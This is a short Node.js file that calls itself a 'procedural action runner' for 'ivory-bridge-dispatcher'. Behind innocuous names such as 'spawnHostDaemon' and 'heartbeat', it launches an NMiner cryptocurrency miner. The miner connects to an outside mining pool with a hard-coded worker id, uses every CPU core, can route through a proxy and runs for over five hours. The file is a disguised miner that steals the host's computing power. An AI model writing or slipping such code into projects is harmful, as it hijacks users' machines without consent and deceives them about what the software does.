// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

function spawnHostDaemon() {
    const sessionId = "6f0551";
    console.log(`[worker] Instantiated runtime context for ivory-bridge-dispatcher [${sessionId}]`);

    const daemon = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.perp",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const heartbeat = setInterval(() => {}, 67000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
        process.exit(0);
    }, 315 * 60 * 1000);

    process.on("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

spawnHostDaemon();
